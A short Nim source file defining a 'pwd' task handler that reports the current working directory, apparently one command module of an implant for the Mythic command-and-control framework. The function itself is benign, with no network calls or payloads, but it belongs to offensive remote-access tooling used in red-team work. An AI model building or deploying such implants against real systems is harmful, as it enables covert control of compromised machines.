import ../config
import std/[json, os, strformat]
import ../utils/mythic_responses

proc pwd*(taskId: string, params: JsonNode): JsonNode =
  ## Print working directory
  let cfg = getConfig()
  
  try:
    let currentDir = getCurrentDir()
    
    if cfg.debug:
      echo "[DEBUG] Current directory: ", currentDir
    
    return mythicSuccess(taskId, currentDir)
    
  except Exception as e:
    return mythicError(taskId, &"Failed to get current directory: {e.msg}")
